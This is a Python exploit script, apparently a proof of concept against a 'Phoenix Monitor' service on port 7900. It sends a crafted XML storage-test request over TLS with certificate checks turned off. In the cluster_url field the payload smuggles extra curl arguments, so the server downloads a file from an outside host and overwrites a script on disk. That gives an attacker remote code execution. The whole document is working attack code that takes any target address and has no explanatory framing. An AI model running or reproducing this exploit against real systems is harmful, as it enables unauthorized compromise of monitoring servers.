#!/usr/bin/python3
import argparse
import socket
import struct
import ssl


# 81 - handleStorageRequest
# [command]=/opt/phoenix/phscripts/bin/elastic_test_url.sh 'test_name' 'http://10.0.40.83:9200'
payload = """<TEST_STORAGE type="elastic">
    <client_type>javaTransportClient</client_type>
    <cluster_name>test_name</cluster_name>
    <cluster_ip>10.0.40.83</cluster_ip>
    <cluster_url>http://10.0.40.83:9200 --next -o /opt/charting/redishb.sh http://10.0.40.83:9200</cluster_url>
    <java_port>5555</java_port>
    <http_port>4444</http_port>
    <number_of_shards>3</number_of_shards>
    <number_of_replicas>4</number_of_replicas>
    <elasticsearch_service_type>test_type</elasticsearch_service_type>
    <username>testuser</username>
    <password>testpass</password>
</TEST_STORAGE>
"""

def send_command(target: str, port: int):
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        with c.wrap_socket(s, server_hostname=target) as ss:
                ss.connect((target, port))

                msg = b''
                msg += struct.pack('<I', 156)
                msg += struct.pack('<I', len(payload))
                msg += struct.pack('<I', 1075724911)
                msg += struct.pack('<I', 0)
                msg += payload.encode()
                print(f'[*] Sending:\n{payload}')

                ss.sendall(msg)
                print(f'[+] Sent!')
               
                d = ss.recv(1024)
                print(f'[+] Recevied: {d}')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-p', '--port', help='The port of the Phoenix Monitor service', type=int, default=7900)
    args = parser.parse_args()

    send_command(args.target, args.port)

